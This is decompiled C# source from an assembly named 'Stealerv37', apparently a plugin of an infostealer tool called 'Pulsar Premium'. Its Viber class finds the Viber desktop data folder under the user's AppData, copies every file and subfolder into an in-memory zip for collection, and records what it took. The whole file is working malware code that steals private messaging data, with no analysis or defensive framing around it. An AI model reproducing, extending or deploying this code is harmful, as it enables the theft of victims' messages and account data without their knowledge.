// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Messangers.Viber
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.IO;

#nullable disable
namespace Intelix.Targets.Messangers;

public class Viber : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "ViberPC", "data");
    if (!Directory.Exists(path))
      return;
    string entry = nameof (Viber);
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = nameof (Viber);
    Array.ForEach<string>(Directory.GetFiles(path), (Action<string>) (file => zip.AddFile($"{entry}\\{Path.GetFileName(file)}", File.ReadAllBytes(file))));
    Array.ForEach<string>(Directory.GetDirectories(path), (Action<string>) (dir => zip.AddDirectoryFiles(dir, entry)));
    counterApplications.Files.Add($"{path} => {entry}");
    counterApplications.Files.Add(entry);
    counter.Messangers.Add(counterApplications);
  }
}
